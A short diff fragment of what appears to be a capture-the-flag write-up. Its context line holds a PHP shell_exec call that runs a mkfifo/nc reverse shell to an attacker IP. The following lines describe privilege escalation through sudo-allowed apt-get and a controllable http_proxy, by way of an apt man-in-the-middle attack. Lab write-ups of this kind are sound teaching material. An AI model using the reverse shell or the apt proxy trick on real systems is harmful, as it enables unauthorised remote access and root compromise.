@@ -94,6 +94,7 @@ echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.
 ```
 # Privelge Escalation
 ~I used LinEnum.sh as enumeration script
+
 As result of command ```sudo -l``` we find that we run apt-get update && apt-get upgrade and change environment variable http_proxy, so apt is our attack vector.
 on internet we find an apt mitm (man in the middle) vuln, so did the following steps.
 
